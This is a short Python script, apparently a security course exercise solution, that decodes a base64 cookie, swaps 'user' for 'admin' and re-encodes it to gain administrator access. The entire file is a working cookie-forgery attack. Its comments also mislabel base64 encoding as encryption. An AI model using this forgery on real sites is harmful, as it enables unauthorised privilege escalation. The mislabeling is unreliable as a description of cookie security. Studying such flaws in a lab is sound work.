import base64

def tamper_cookie(encrypted):
    clear_text = base64.b64decode(encrypted).decode('utf-8')
    print('Clear text of cookie: ' + clear_text)

    new_text = clear_text.replace('user', 'admin')
    print('New transformed cookie to access as admin: ' + new_text)

    new_encrypted = base64.b64encode(new_text.encode('utf-8'))
    print('New encrypted cookie: ' + new_encrypted.decode('utf-8'))

    return new_encrypted.decode('utf-8')

if __name__ == '__main__':
    tamper_cookie('bWF0dGUsMTY2NzU1MTg0MSxjb200MDIsaHczLGV4MSx1c2Vy')